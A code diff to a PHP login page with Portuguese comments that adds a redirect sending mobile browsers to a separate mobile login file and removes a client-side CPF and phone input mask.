@@ -1,4 +1,17 @@
 <?php
+// --- LÓGICA DE DETECÇÃO E REDIRECIONAMENTO DE DISPOSITIVO ---
+// Pega o User Agent do navegador que está acessando a página
+$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+
+// Verifica se o User Agent contém strings comuns de dispositivos móveis
+$isMobile = preg_match('/(Mobi|Android|iPhone|iPad|iPod|BlackBerry|Windows Phone)/i', $userAgent);
+
+// Se for um dispositivo móvel, redireciona para a página de login mobile e para a execução do script
+if ($isMobile) {
+    header('Location: login_mobile.php'); // Você pode alterar "login_mobile.php" para o nome do seu arquivo de login mobile
+    exit;
+}
+
 // Inicia a sessão para uso futuro
 session_start();
 
@@ -92,34 +105,9 @@ if (!isset($_COOKIE['identificador_cliente'])) {
         const errorDiv = document.getElementById('error-message');
         const submitBtn = loginForm.querySelector('.btn-continue');
 
-        // --- NOVA MÁSCARA DE INPUT INTELIGENTE ---
-        identificadorInput.addEventListener('input', (e) => {
-            const rawValue = e.target.value;
-            
-            // Se o usuário está digitando um email (contém letras ou @), não faz nada.
-            if (/[a-zA-Z]/.test(rawValue) || rawValue.includes('@')) {
-                return;
-            }
-
-            // Se forem apenas números, aplica a máscara de CPF/Telefone
-            let value = rawValue.replace(/\D/g, ''); // Remove tudo que não for dígito
-            value = value.substring(0, 14); // Limita o tamanho para evitar inputs longos
-
-            // Máscara dinâmica (CPF ou Celular)
-            if (value.length > 11) { // Formato de Celular com 9 dígitos + DDD
-                 value = value.replace(/^(\d{2})(\d{5})(\d{4}).*/, '($1) $2-$3');
-            } else if (value.length > 10) { // Celular com 8 dígitos + DDD
-                 value = value.replace(/^(\d{2})(\d{4})(\d{4}).*/, '($1) $2-$3');
-            } else if (value.length > 6) {
-                value = value.replace(/^(\d{2})(\d{4})(.*)/, '($1) $2-$3');
-            } else if (value.length > 2) {
-                value = value.replace(/^(\d{2})(.*)/, '($1) $2');
-            }
-
-            e.target.value = value;
-        });
+        // --- BLOCO DA MÁSCARA DE INPUT FOI REMOVIDO ---
         
-        // --- FUNÇÕES DE VALIDAÇÃO ---
+        // --- FUNÇÕES DE VALIDAÇÃO (INALTERADAS) ---
         const isValidEmail = (email) => {
             const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
             return re.test(String(email).toLowerCase());
@@ -146,7 +134,7 @@ if (!isset($_COOKIE['identificador_cliente'])) {
             return phone.length >= 10 && phone.length <= 11;
         };
 
-        // --- LÓGICA DE SUBMISSÃO DO FORMULÁRIO ---
+        // --- LÓGICA DE SUBMISSÃO DO FORMULÁRIO (INALTERADA) ---
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
             errorDiv.textContent = ''; // Limpa erros antigos
